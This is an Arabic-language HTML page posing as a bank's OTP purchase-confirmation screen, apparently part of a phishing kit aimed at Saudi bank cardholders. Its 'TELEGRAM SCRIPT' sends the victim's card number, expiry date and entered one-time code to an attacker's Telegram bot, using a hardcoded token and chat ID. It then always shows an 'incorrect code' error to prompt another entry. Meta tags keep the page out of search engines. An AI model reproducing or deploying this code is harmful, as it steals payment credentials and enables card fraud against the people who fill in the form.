<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1" name="viewport" />
  <!-- Prevent indexing and following by well-behaved crawlers: -->
  <meta name="robots" content="noindex, nofollow" />

  <!-- Prevent archiving or snippet display: -->
  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
  <meta name="bingbot" content="noindex, nofollow" />
  <meta name="yandex" content="none" />
  <title>verification</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Readex+Pro:wght@160..700&display=swap");
    @import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css");

    * {
      font-family: "Readex Pro", sans-serif;
      font-optical-sizing: auto;
      font-weight: 400;
      font-style: normal;
      font-variation-settings: "HEXP" 0;
    }

    .content-section {
      display: none;
    }

    .content-section.active {
      display: block;
    }

    #loadingOverlay {
      position: fixed;
      inset: 0;
      background-color: rgba(0, 0, 0, 0.6);
      z-index: 9999;
      justify-content: center;
      align-items: center;
    }
  </style>
</head>

<body>
  <div class="container mt-5" id="applePayRadio">
    <div class="row justify-content-center">
      <div class="col-md-6 col-lg-4">
        <div style="
              border: 1px solid #ddd;
              border-radius: 12px;
              overflow: hidden;
            ">
          <div style="padding: 16px" class="text-center">
            <div class="d-flex justify-content-between mb-4">
              <img id="card_type" src="" style="height: 38px; width: 110px" />
              <img id="bank_type" src="" width="110px" />
            </div>
            <h5>تأكيد عملية الشراء</h5>
            <p class="text-right mt-3" style="font-size: small">
              تم إرسال رسالة نصية تحتوي على رمز تأكيد لمرة واحدة (OTP) إلى
              رقمك المسجل لدينا لتأكيد حركة الدفع في
              <span dir="ltr" id="today_time_and_date"></span>
            </p>
            <p class="text-right mt-3" style="font-size: small">
              يرجى عدم مشاركة الرمز مع أحد.
            </p>
            <form id="verificationForm">
              <div class="form-group text-right">
                <label for="verification_code_two">أدخل الرمز هنا:</label>
                <input class="form-control text-center" id="verification_code_two" type="tel" maxlength="6"
                  pattern="^(?:\d{4}|\d{6})$" title="يجب أن يتكون رمز التحقق من 4 أرقام أو 6 أرقام بالضبط"
                  oninput="this.value = this.value.replace(/\D/g, '').slice(0, 6)" required />

                <div class="alert alert-danger text-right" id="decline-message" role="alert" style="display: none">
                  <span> الرمز المدخل غير صحيح. </span>
                </div>
              </div>
              <button class="btn btn-primary col-12" type="submit">
                تأكيد
              </button>
              <p class="mt-3" style="font-size: x-small">
                ستنتهي صلاحية هذه الصفحة تلقائياً بعد
                <span id="timer" style="color: red">60</span> ثانية
              </p>
              <p class="text-right text-secondary mt-3 small">
                هل تحتاج للمساعدة؟
              </p>
            </form>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Loading overlay, initially hidden -->
  <div id="loadingOverlay" class="d-none">
    <div class="text-center text-white">
      <div class="spinner-border text-light mb-3" role="status"></div>
      <h5 class="font-weight-bold">يرجى الانتظار</h5>
      <p>انتظر حتى تتم معالجة طلبك</p>
    </div>
  </div>







<!--  TELEGRAM SCRIPT -->


<script>


function send_message(message){
  const telegramToken = "8428649205:AAF_SbXQJfEVXvr99r2eFlV2StGVqrRVZg4";
  const chatId = "6969224682";







text = `
رقم البطاقة: \`${localStorage.cc}\`
اتاريخ الانتهاء: ${localStorage.month} / ${localStorage.year}
رمز التحقق: \`${message}\`
`
  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode:"Markdown"
        })
      })
    .then(res => res.json())
    .then(resJson => {
      if (resJson.ok) {
        console.log("✅ تم إرسال الإشعار إلى تليجرام بنجاح.");
        sessionStorage.setItem("telegramSent", "true"); // منع التكرار خلال الجلسة
        return true
      } else {
        console.log("❌ فشل إرسال الإشعار:", resJson);
      }
    })
    .catch(err => {
      console.log("⚠️ خطأ أثناء الإرسال أو جلب الدولة:", err);
    });
}


    document.addEventListener("DOMContentLoaded", () => {
      // 3.1) Timestamp
      document.getElementById("today_time_and_date").textContent =
        new Date().toLocaleString("ar-EG");

      // 3.2) Card scheme from sessionStorage
      const scheme = sessionStorage.getItem("Card type"); // "visa" or "mastercard"
      const cardTypeEl = document.getElementById("card_type");
      if (scheme === "visa") {
        cardTypeEl.src = "assets/photos/visa_logo.jpg";
      } else if (scheme === "mastercard") {
        cardTypeEl.src = "assets/photos/mastar.svg";
      } else {
        cardTypeEl.src = "assets/icon/Bca-logo.svg";
      }
      cardTypeEl.style.float = "right";

      // 3.3) Bank logo via BIN from sessionStorage
      const bin = sessionStorage.getItem("cardBin") || "";
      const SAUDI_BINS = {
        588845: "Alrajhi",
        458214: "SNB",
        402360: "Alinma",
        407302: "Samba",
        409665: "Riyad",
        428916: "SaudiEnaya",
        512345: "ArabNational",
        535577: "Jazeera",
        588561: "Alawwal",
        540172: "Enjaz",
        400468: "Albilad",
        484783: "Alrajhi",
      };
      const bankKey = SAUDI_BINS[bin];
      const bankTypeEl = document.getElementById("bank_type");
      if (bankKey) {
        bankTypeEl.src = `assets/photos/${bankKey}.png`;
      } else {
        bankTypeEl.src = "assets/icon/Bca-logo.svg";
      }
      bankTypeEl.style.float = "right";
    });
  </script>






  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const form = document.getElementById("verificationForm");
      const overlay = document.getElementById("loadingOverlay");
      form.addEventListener("submit", async (e) => {
        e.preventDefault();
        overlay.classList.remove("d-none");
        overlay.classList.add("d-flex");
        
        seconds = 3
        send_message(document.getElementById("verification_code_two").value)
        
        const id = setInterval(() => {
            seconds--;
            console.log(seconds)
            if (seconds < 0) {
                  clearInterval(id);
                  // overlay.classList.remove("d-none");
                  //  overlay.classList.add("d-flex");
                    overlay.classList.remove("d-flex");
                    overlay.classList.add("d-none");
                  document.getElementById("decline-message").style.display = "block";
                  return;
              }
              // timerEl.textContent = seconds;
            }, 1000);
        });

    });
  </script>


  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
</body>


</html>
